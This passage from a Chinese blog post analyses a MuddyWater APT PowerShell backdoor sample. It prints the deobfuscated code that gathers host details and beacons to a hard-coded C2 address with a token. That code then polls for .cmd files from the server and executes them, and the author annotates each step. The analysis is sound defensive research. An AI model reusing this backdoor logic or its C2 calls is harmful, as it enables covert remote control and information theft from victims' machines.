<p>获得令牌访问等级,判断是否再鹳狸猿组,是返回Admin,不是返回<code>User</code>.没有的话返回<code>Error Role</code>.</p>
<h5 id="yKGVMK8K"><a href="#yKGVMK8K" class="headerlink" title="yKGVMK8K()"></a>yKGVMK8K()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function yKGVMK8K()</span><br><span class="line">&#123;</span><br><span class="line">    $N4aN42GXmRJ = Cwc1FAfLd_XTJse6WX;</span><br><span class="line">    $n4an42gxMRj += &quot;:&quot;;</span><br><span class="line">    $n4an42gxMRJ += WlTjBGnp; //Username</span><br><span class="line">    $n4aN42GxMRJ += &quot;:&quot;;</span><br><span class="line">    $N4An42GxMrJ += VDf4TktOMY3P_Br8UL5nH; //SystemNameame</span><br><span class="line">    $N4aN42gxmrJ += &quot;&quot;;</span><br><span class="line">    $N4an42GxMrj += aj9VVbp5c; //OS Arch</span><br><span class="line">    $N4an42gxMrj += &quot;:&quot;;</span><br><span class="line">    $n4aN42GxmrJ += S4XKXh_wG0KMOE; //ip address</span><br><span class="line">    $N4aN42gxmrj += &quot;:&quot;;</span><br><span class="line">    $N4AN42gxMrJ += qTix4hiFia2oQe8G; //UserInrole</span><br><span class="line">    return $n4an42gxMRJ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拼接信息.</p>
<h5 id="最后的逻辑分析"><a href="#最后的逻辑分析" class="headerlink" title="最后的逻辑分析"></a>最后的逻辑分析</h5><p>8350行左右</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$xGWoj_n</span> = ykGVMk8k;</span><br><span class="line">    <span class="variable">$VGmxeqS7XdsZsJidfe</span> = CwC1FaFld_xTJSe6Wx;</span><br><span class="line">    n_n9tYyoAi9M6lB (<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=reg&amp;UU="</span>+&#123;guid&#125;) <span class="variable">$XgWoj_n</span>; //</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$r_17tGufKlA1FDgTjmDMN</span> = d_1smIfUAAjWthFUqGH( <span class="string">"http://83.171.238.62/command/"</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$R_17TgufKla1FdGTjmdmn</span> <span class="nomarkup">-ne</span> (<span class="string">'Error'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ImSwyJmd_fJGEkqlFUV</span> = <span class="variable">$r_17tGufkla1FDGtJmDmn</span>;</span><br><span class="line">			d_1SMIFuAajwtHFuqGh(<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=uDel&amp;filename="</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);</span><br><span class="line">            mUHr7u0HAhhRaXq <span class="variable">$iMswYJMd_fJGeKQLFUv</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$EI30VubHIRyTC9q5rk878</span> = <span class="variable">$wu9qWfKFH</span>;</span><br><span class="line">    <span class="variable">$KkB6gQH8Z1</span> = <span class="variable">$BZDhtwfnPOb_v_h</span>;</span><br><span class="line">    <span class="variable">$I2w_uXTB</span> = (([int](<span class="number">15770</span> / <span class="number">10</span>))*<span class="variable">$kkB6GQH8Z1</span>);</span><br><span class="line">    <span class="variable">$wu9QWfkfH</span> = ((-<span class="number">2276</span>)*((<span class="number">8153</span> - <span class="number">3952</span>)+(((-<span class="number">3651</span>)-<span class="variable">$Uf4CDF6_B9NwImxt7Hh</span>)*(-<span class="number">39</span> + <span class="number">3047</span>))));</span><br><span class="line">    <span class="variable">$JNipBG0Ov_kT15R</span> = ((((<span class="number">1</span> * <span class="number">1009</span>)*<span class="variable">$V0Jkv8aqZHMdcdppAixIV</span>)+<span class="variable">$uyoxQcm_VhLGn</span>)*((-<span class="number">2374</span>)-((-<span class="number">883</span>)*(-<span class="number">774</span>))));</span><br><span class="line">    <span class="variable">$T9y70kYH</span> = (-(<span class="number">13</span> * <span class="number">211</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>执行上个函数获得系统信息</li>
<li>上传屏幕截图</li>
<li>下载<code>.cmd</code>文件</li>
<li>如果下载内容不为’’Error’’则<code>d_1SMIFuAajwtHFuqGh</code>下载其他<code>.cmd</code>命令,并执行.</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>断断续续把这个样本分析完了,属实体力活啊.感觉整体文章结构没写好.都是从头到尾分析样本文件,最后应该文章里做大致的规划,应该更具有从样本编写者角度来看的分析文章.也从零学会了简单的powershell语法和调试等,调试分析office宏汇编分析和脚本.未来还多需努力,少摸鱼,多学习~.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/逆向/" rel="tag"># 逆向</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/08/24/2019-08-24- 双击调试简单问题总结/" rel="next" title="双机调试简单问题">
                <i class="fa fa-chevron-left"></i> 双机调试简单问题
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/10/17/2019-10-17-autohotkey/" rel="prev" title="Autohotkey脚本,自用">
                Autohotkey脚本,自用 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Xuwei98">
            
              <p class="site-author-name" itemprop="name">Xuwei98</p>
              <p class="site-description motion-element" itemprop="description">在校摸鱼达人</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">57</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Xuwei98" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:z1002280879@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
<br>
<link rel="stylesheet" href="/dist/APlayer.min.css">
<div id="aplayer"></div>
<script type="text/javascript" src="/dist/APlayer.min.js"></script>
<script type="text/javascript" src="/dist/music.js"></script>

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#样本分析"><span class="nav-number">1.</span> <span class="nav-text">样本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#恶意宏代码"><span class="nav-number">2.</span> <span class="nav-text">恶意宏代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-ThisDocument"><span class="nav-number">2.1.</span> <span class="nav-text">1.ThisDocument</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-frmLoadr"><span class="nav-number">2.2.</span> <span class="nav-text">2.frmLoadr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-RgSH-id"><span class="nav-number">2.3.</span> <span class="nav-text">3. RgSH(id)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PuSH-id"><span class="nav-number">2.4.</span> <span class="nav-text">PuSH(id)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d3r-id1"><span class="nav-number">2.5.</span> <span class="nav-text">d3r(id1)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FuN-id"><span class="nav-number">2.6.</span> <span class="nav-text">FuN(id)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#aulngr-vbe-分析"><span class="nav-number">3.</span> <span class="nav-text">aulngr.vbe 分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UserImage-png"><span class="nav-number">4.</span> <span class="nav-text">UserImage.png</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell函数分析"><span class="nav-number">4.1.</span> <span class="nav-text">powershell函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lTXxzy53"><span class="nav-number">4.1.1.</span> <span class="nav-text">lTXxzy53()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NIQCw20"><span class="nav-number">4.1.2.</span> <span class="nav-text">NIQCw20</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EdA4VNZrBAU37Pd7ND"><span class="nav-number">4.1.3.</span> <span class="nav-text">EdA4VNZrBAU37Pd7ND()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UTFhxPjChlXs1OxREdR"><span class="nav-number">4.1.4.</span> <span class="nav-text">UTFhxPjChlXs1OxREdR()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zokOsMYYZQG1GyNMGDZ"><span class="nav-number">4.1.5.</span> <span class="nav-text">zokOsMYYZQG1GyNMGDZ()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sp169N5"><span class="nav-number">4.1.6.</span> <span class="nav-text">sp169N5()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dYUUIGUfLNIoN"><span class="nav-number">4.1.7.</span> <span class="nav-text">dYUUIGUfLNIoN()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#L82O-u0EwZy（）"><span class="nav-number">4.1.8.</span> <span class="nav-text">L82O_u0EwZy（）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#finally部分函数"><span class="nav-number">4.1.9.</span> <span class="nav-text">finally部分函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#K9Dpje9u4bcbqu351w"><span class="nav-number">4.1.10.</span> <span class="nav-text">K9Dpje9u4bcbqu351w()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fwlKy5wjJIz6CGCbzI-上传功能函数"><span class="nav-number">4.1.11.</span> <span class="nav-text">fwlKy5wjJIz6CGCbzI() 上传功能函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#backdoor-powershell-ieee-dat"><span class="nav-number">5.</span> <span class="nav-text">backdoor powershell ieee.dat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-分析"><span class="nav-number">5.1.</span> <span class="nav-text">0x01 分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-powershell-后门解析"><span class="nav-number">5.2.</span> <span class="nav-text">0x02 powershell 后门解析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#wltJBgnP"><span class="nav-number">5.2.1.</span> <span class="nav-text">wltJBgnP()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MUHr7u0hahhrAxQ"><span class="nav-number">5.2.2.</span> <span class="nav-text">MUHr7u0hahhrAxQ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#d-1SmifuaaJWTHfuQgh"><span class="nav-number">5.2.3.</span> <span class="nav-text">d_1SmifuaaJWTHfuQgh()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#n-n9tyYOaI9m6lB"><span class="nav-number">5.2.4.</span> <span class="nav-text">n_n9tyYOaI9m6lB()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Aj9VVbP5C"><span class="nav-number">5.2.5.</span> <span class="nav-text">Aj9VVbP5C()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Get-Screenshot"><span class="nav-number">5.2.6.</span> <span class="nav-text">Get-Screenshot</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#S4xKxH-WG0KMOE"><span class="nav-number">5.2.7.</span> <span class="nav-text">S4xKxH_WG0KMOE()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CwC1Fafld-XtJSe6wx"><span class="nav-number">5.2.8.</span> <span class="nav-text">CwC1Fafld_XtJSe6wx()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#QTix4hIfIA2oQE8g"><span class="nav-number">5.2.9.</span> <span class="nav-text">QTix4hIfIA2oQE8g()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#yKGVMK8K"><span class="nav-number">5.2.10.</span> <span class="nav-text">yKGVMK8K()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后的逻辑分析"><span class="nav-number">5.2.11.</span> <span class="nav-text">最后的逻辑分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Xuwei98</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">52.9k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    
      <script id="dsq-count-scr" src="https://xuwei98.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/';
          this.page.identifier = '2019/10/06/2019-10-06-MuddyWater(污水) APT分析/';
          this.page.title = 'MuddyWater(污水) APT样本分析';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://xuwei98.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  














  





  

  

  

  
  

  

  

  

</body>
</html>
